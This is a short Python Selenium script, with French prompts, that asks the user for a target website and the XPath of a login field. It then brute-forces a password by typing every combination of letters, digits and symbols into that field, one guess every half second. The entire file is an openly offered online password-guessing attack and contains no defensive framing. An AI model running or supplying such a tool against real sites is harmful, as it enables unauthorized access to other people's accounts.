import time
from itertools import product
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.chrome.service import Service
from webdriver_manager.chrome import ChromeDriverManager
from selenium.webdriver.chrome.options import Options

liste = [
  'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o',
  'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', 'A', 'B', 'C', 'D',
  'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S',
  'T', 'U', 'V', 'W', 'X', 'Y', 'Z', '1', '2', '3', '4', '5', '6', '7', '8',
  '9', '0', '!', '@', '*', '?', '§', '%', '$', '£', 'µ'
]

timeSleep = 0.5

website = input("Quel site voulez_vous prendre pour cible")

service = Service(ChromeDriverManager().install())
driver = webdriver.Chrome(service=service)
driver.get(website)

xpath = input("Tapez le xpath")

input_xpath_messageBox = xpath
input_messageBox = driver.find_element(by=By.XPATH,
                                       value=input_xpath_messageBox)
time.sleep(timeSleep)

print("Le processus peut commencer")

# Generate all possible combinations of letters
for r in range(1, len(liste) + 1):
  for combination in product(liste, repeat=r):
    password = ''.join(combination)
    input_messageBox.send_keys(password)
    input_messageBox.send_keys(Keys.ENTER)
    input_messageBox.clear()
    time.sleep(timeSleep)

print("Mot de Passe introuvable")
